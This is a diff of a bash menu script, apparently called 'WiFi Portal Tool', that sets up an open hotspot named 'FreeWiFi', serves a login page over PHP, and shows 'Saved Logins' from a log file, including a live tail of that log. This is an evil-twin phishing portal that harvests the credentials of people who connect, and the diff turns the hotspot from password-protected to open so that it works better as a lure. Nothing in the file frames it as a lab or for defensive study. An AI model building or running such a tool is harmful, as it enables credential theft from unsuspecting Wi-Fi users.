@@ -3,36 +3,68 @@
 PORTAL_DIR="portal"
 LOG_FILE="logs/log.txt"
 
+# ---------------------------
+# Check if hotspot is running
+# ---------------------------
+is_hotspot_running() {
+    nmcli connection show --active | grep -q '^Hotspot'
+    return $?  # 0 = running, 1 = not running
+}
+
+# ---------------------------
+# Start Open Hotspot
+# ---------------------------
 start_hotspot() {
-    echo "[+] Starting hotspot..."
-    nmcli dev wifi hotspot ifname wlan0 ssid FreeWiFi password 12345678
-}
-
-start_server() {
-    echo "[+] Starting portal server in background..."
-    cd $PORTAL_DIR || exit
-    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
-    SERVER_PID=$!
-    echo $SERVER_PID > ../server.pid
-    cd ..
-    echo "[+] Server running on http://localhost:8080"
-}
-
-stop_server() {
-    if [ -f server.pid ]; then
-        kill $(cat server.pid) 2>/dev/null
-        rm server.pid
-        echo "[+] Server stopped"
+    if is_hotspot_running; then
+        echo "[!] Hotspot is already running!"
     else
-        echo "[-] No server running"
+        echo "[+] Starting open hotspot..."
+        
+        # Delete old Hotspot connection if exists
+        nmcli connection delete Hotspot 2>/dev/null
+
+        # Start hotspot (default password temporarily)
+        nmcli dev wifi hotspot ifname wlan0 ssid FreeWiFi password ""
+
+        # Remove password to make it open
+        nmcli connection modify Hotspot 802-11-wireless-security.key-mgmt none
+
+        if [ $? -eq 0 ]; then
+            echo "[+] Open hotspot started successfully!"
+        else
+            echo "[-] Failed to start hotspot. Check your Wi-Fi interface."
+        fi
     fi
 }
 
+# ---------------------------
+# Stop Hotspot
+# ---------------------------
 stop_hotspot() {
-    echo "[+] Stopping hotspot..."
-    nmcli connection down Hotspot
+    if is_hotspot_running; then
+        echo "[+] Stopping hotspot..."
+        nmcli connection down Hotspot
+    else
+        echo "[!] No hotspot is currently running."
+    fi
 }
 
+# ---------------------------
+# Start Login Page Server
+# ---------------------------
+start_server() {
+    if [ ! -d "$PORTAL_DIR" ]; then
+        echo "[-] Portal directory '$PORTAL_DIR' does not exist!"
+        return
+    fi
+    echo "[+] Starting portal server..."
+    cd "$PORTAL_DIR" || exit
+    php -S 0.0.0.0:8080
+}
+
+# ---------------------------
+# View Saved Logins
+# ---------------------------
 view_logs() {
     echo "---- Saved Logins ----"
     if [ -f "$LOG_FILE" ]; then
@@ -43,6 +75,9 @@ view_logs() {
     echo "----------------------"
 }
 
+# ---------------------------
+# Live log view
+# ---------------------------
 live_logs() {
     echo "[+] Live log view (Ctrl+C to exit)"
     if [ ! -f "$LOG_FILE" ]; then
@@ -51,43 +86,54 @@ live_logs() {
     tail -f "$LOG_FILE"
 }
 
+# ---------------------------
+# Edit login page
+# ---------------------------
 edit_page() {
-    nano $PORTAL_DIR/index.html
+    if [ ! -f "$PORTAL_DIR/index.html" ]; then
+        echo "[-] Login page does not exist!"
+        return
+    fi
+    nano "$PORTAL_DIR/index.html"
 }
 
+# ---------------------------
+# Setup folders and files
+# ---------------------------
 setup() {
     echo "[+] Setting up folders..."
-    mkdir -p portal logs
-    touch logs/log.txt
-    chmod 666 logs/log.txt
-    echo "[+] Done"
+    mkdir -p "$PORTAL_DIR" logs
+    touch "$LOG_FILE"
+    chmod 666 "$LOG_FILE"
+    echo "[+] Setup complete!"
 }
 
+# ---------------------------
+# Main Number Menu
+# ---------------------------
 while true; do
     echo ""
     echo "====== WiFi Portal Tool ======"
     echo "1) Setup (first time)"
-    echo "2) Start Hotspot"
-    echo "3) Start Login Page Server"
-    echo "4) Stop Server"
-    echo "5) Stop Hotspot"
-    echo "6) View Saved Logins"
-    echo "7) Live View Logs"
-    echo "8) Edit Login Page"
-    echo "9) Exit"
+    echo "2) Start Open Hotspot"
+    echo "3) Stop Hotspot"
+    echo "4) Start Login Page Server"
+    echo "5) View Saved Logins"
+    echo "6) Live View Logs"
+    echo "7) Edit Login Page"
+    echo "8) Exit"
     echo "=============================="
     read -p "Select option: " choice
 
     case $choice in
         1) setup ;;
         2) start_hotspot ;;
-        3) start_server ;;
-        4) stop_server ;;
-        5) stop_hotspot ;;
-        6) view_logs ;;
-        7) live_logs ;;
-        8) edit_page ;;
-        9) echo "Exiting..."; exit ;;
+        3) stop_hotspot ;;
+        4) start_server ;;
+        5) view_logs ;;
+        6) live_logs ;;
+        7) edit_page ;;
+        8) echo "Exiting..."; exit ;;
         *) echo "Invalid option" ;;
     esac
 done
